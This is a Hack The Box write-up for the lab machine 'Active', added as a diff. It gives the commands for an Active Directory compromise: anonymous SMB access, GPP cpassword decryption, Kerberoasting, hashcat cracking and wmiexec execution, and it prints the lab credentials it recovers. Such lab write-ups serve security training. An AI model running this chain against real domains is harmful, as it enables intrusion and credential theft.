@@ -1,0 +1,140 @@
+🔴 HTB Writeup – Active
+📌 Overview
+
+Machine Name: Active
+Difficulty: Easy
+Category: Active Directory / Windows
+Key Techniques:
+
+SMB Anonymous Access
+Group Policy Preferences (GPP) Credential Extraction
+Kerberoasting
+Hash Cracking
+Remote Code Execution via WMI
+
+🧠 Attack Path Summary
+Full port and service enumeration → Identify Domain Controller
+SMB enumeration → Anonymous access to SYSVOL
+Extract GPP cpassword → Recover service account credentials
+LDAP enumeration → Identify Kerberoastable users
+Kerberoasting → Extract service ticket hash
+Crack hash → Obtain Administrator credentials
+WMI execution → SYSTEM access → Root
+
+🔍 Enumeration
+🔹 Nmap Scan
+sudo nmap -Pn -p- -T4 -sS -sV -sC \
+  --script "default,vuln,smb-vuln*,ftp-anon,ftp-syst,ftp-bounce,http-methods,http-enum,http-webdav-scan" \
+  --script-timeout 20s --max-retries 2 \
+  -oA nmap_full 10.129.18.70
+🔹 Autorecon
+autorecon 10.129.18.70 \
+-m 100 \
+-mp 20 \
+-o autorecon_vm3 \
+--dirbuster.tool feroxbuster \
+--dirbuster.threads 50 \
+-v
+
+🧩 Key Findings
+SMB (445) open
+LDAP (389) open
+Kerberos (88) open
+
+Host behaves like a Domain Controller
+
+📂 SMB Enumeration
+🔹 Anonymous Login
+smbclient -L //10.129.18.70 -N
+
+✔ Anonymous access allowed
+
+🔹 Access Shares
+smbclient //10.129.18.70/Replication -N
+Access to Replication share confirmed
+Users share initially inaccessible
+🔹 Locate GPP Credentials
+
+Navigated to:
+
+/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+🔹 Extract cpassword
+gpp-decrypt "$(grep -oP 'cpassword="\K[^"]+' ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml)"
+
+🔑 Credentials Recovered
+SVC_TGS : GPPstillStandingStrong2k18
+🔹 Re-Enumerate SMB with Credentials
+smbclient -L //10.129.18.70 -U SVC_TGS
+
+✔ Now able to access additional shares, including Users
+
+🏁 User Flag
+
+Located in:
+
+C:\Users\<user>\Desktop\user.txt
+
+🚀 Privilege Escalation
+🔹 LDAP Enumeration
+ldapsearch -x -H ldap://10.129.19.56 \
+-D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' \
+-b "dc=active,dc=htb" \
+-s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" \
+samaccountname | grep sAMAccountName
+
+🧩 Findings
+Multiple users identified
+Administrator account active
+SVC_TGS account present
+🔹 Kerberoasting
+GetUserSPNs.py active.htb/svc_tgs:'GPPstillStandingStrong2k18' -dc-ip 10.129.19.56
+🔹 Request Service Ticket
+GetUserSPNs.py active.htb/svc_tgs:'GPPstillStandingStrong2k18' \
+-dc-ip 10.129.19.56 -request
+
+✔ Extracted Kerberos service ticket hash
+
+🔹 Crack Hash
+hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force
+
+🔑 Credentials Recovered
+Administrator : Ticketmaster1968
+🔹 Remote Code Execution (WMI)
+wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.19.56
+
+✔ SYSTEM-level access obtained
+
+🏁 Root Flag
+C:\Users\Administrator\Desktop\root.txt
+
+🧠 Key Takeaways
+GPP Credentials are still a real-world risk
+Misconfigured SYSVOL can expose plaintext creds
+Anonymous SMB access is dangerous
+Always check for readable shares early
+Kerberoasting remains highly effective
+Weak service account passwords = full domain compromise
+Attack Chain Matters
+Enumeration → Credential Access → Priv Esc → Execution
+
+🔁 Alternative Paths
+BloodHound enumeration (if creds obtained earlier)
+Crack other SPNs if multiple exist
+SMB relay (if signing disabled)
+
+🧰 Tools Used
+Nmap
+Autorecon
+smbclient
+gpp-decrypt
+ldapsearch
+Impacket (GetUserSPNs.py, wmiexec.py)
+Hashcat
+
+📌 Final Thoughts
+
+This machine is a perfect example of:
+
+Why misconfigurations in AD environments are critical
+How small leaks (GPP) lead to domain compromise
+The importance of chaining techniques together
